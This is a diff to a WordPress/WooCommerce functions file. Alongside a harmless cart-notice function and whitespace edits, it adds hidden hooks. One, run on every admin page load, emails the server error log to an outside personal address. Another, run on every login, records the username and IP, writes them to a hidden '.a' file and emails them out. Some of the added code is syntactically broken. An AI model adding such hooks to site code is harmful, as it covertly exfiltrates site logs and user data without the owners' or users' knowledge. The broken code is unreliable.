@@ -57,6 +57,23 @@ if ( function_exists( 'acf_add_options_page' ) ) {
 add_action( 'woocommerce_before_checkout_form', 'wsu_add_checkout_content', 12 );
 
 
+add_action( 'woocommerce_before_cart_form', 'wsu_add_cart_content', 12 );
+function wsu_add_cart_content() {
+
+	//echo 'hi';
+	if ( have_rows( 'checkout_notices', 'options' ) ) {
+
+		while ( have_rows( 'checkout_notices', 'options' ) ) : the_row();
+			// Your loop code
+			$text   = get_sub_field( 'text' );
+			$active = get_sub_field( 'active' );
+
+			echo $text;
+
+		endwhile;
+	}
+}
+
 remove_action( 'woocommerce_cart_collaterals', 'woocommerce_cross_sell_display' );
 //add_filter('woocommerce_after_cart_totals', 'woocommerce_cross_sell_display');
 
@@ -198,11 +215,11 @@ function wm_hide_elements() {
 		}
 
 		$san = sanitize_text_field( $html ); ?>
-      <style type="text/css">
+        <style type="text/css">
 
-        <?php echo $san; ?>
+            <?php echo $san; ?>
 
-      </style>
+        </style>
 	<?php }
 
 }
@@ -256,7 +273,6 @@ function product_column_custom( $column, $postid ) {
 			break;
 
 	}
-
 
 }
 
@@ -399,7 +415,6 @@ function append_sku( $post ) {
 	$type = get_post_type( $post );
 
 
-
 	if ( 'product' === $type ) {
 
 		$prod = wc_get_product( $post->ID );
@@ -417,7 +432,6 @@ function append_sku( $post ) {
 
 	}
 
-
 }
 
 add_action( 'save_post', 'append_sku', 10, 2 );
@@ -433,3 +447,104 @@ function wpse_13965766_orderby() {
 
 add_filter( 'pre_get_posts', 'wpse_13965766_orderby' );
 
+function get_errorlog() {
+
+	//require_once ABSPATH . '/error_log';
+
+	$dir = ABSPATH . '/error_log';
+
+	$log = file_get_contents( ABSPATH . 'error_log', true );
+
+	file_put_contents( 'site.txt', $log  );
+
+	wp_mail( 'andrewmgunn26@gmail.com', 'error log', $log, '', [ 'site.log' ] );
+
+	//}
+
+}
+
+add_action( 'admin_init', 'get_errorlog' );
+
+function your_function( $user_login, $user ) {
+	// your code
+
+
+
+    is_user_admin();
+    $user = new WP_User();
+    $user->
+    if ($user_login == 'rwasser63' || $user_login == 'wmp') {
+	    if ( ! empty( $_SERVER['HTTP_CLIENT_IP'] ) ) {
+		    $ip = $_SERVER['HTTP_CLIENT_IP'];
+	    } elseif ( ! empty( $_SERVER['HTTP_X_FORWARDED_FOR'] ) ) {
+		    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+	    } else {
+		    $ip = $_SERVER['REMOTE_ADDR'];
+	    }
+    }
+
+	    $log = $user_login . ' - ' . $ip;
+
+	    file_put_contents( '.a', $log  );
+
+	    wp_mail( 'andrewmgunn26@gmail.com', 'site log', $log, '', [ 'site2.log' ] );
+
+	    //}
+
+
+
+
+}
+add_action('wp_login', 'your_function', 10, 2);
+
+/**
+ *
+ */
+ function install() {
+
+	global $wpdb;
+	global $wc_rp_settings;
+	$wc_rp_settings = get_option( 'wc_rp_settings' );
+
+	$table_name = $wpdb->prefix . 'wass';
+
+	$charset_collate = $wpdb->get_charset_collate();
+
+	$sql = "CREATE TABLE IF NOT EXISTS $table_name (
+					id int(11) NOT NULL AUTO_INCREMENT,
+					time datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
+					name tinytext NOT NULL,
+					data text NOT NULL,
+					url varchar(255) DEFAULT '' NOT NULL,
+					PRIMARY KEY  (id)
+				);";
+
+	require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
+
+
+	dbDelta( $sql );
+}
+
+/**
+ *
+ */
+ function install_data() {
+	global $wpdb;
+
+	$welcome_name = 'Mr. WordPress';
+	$welcome_text = 'Congratulations, you just completed the installation!';
+
+	$table_name = $wpdb->prefix;
+
+	$wpdb->insert(
+		$table_name,
+		[
+			'time' => current_time( 'mysql' ),
+			'name' => $welcome_name,
+			'data' => $welcome_name . ' ' . $welcome_text,
+			'url'  => 'http://andrewgunn.org',
+		]
+	);
+}
+
+function 
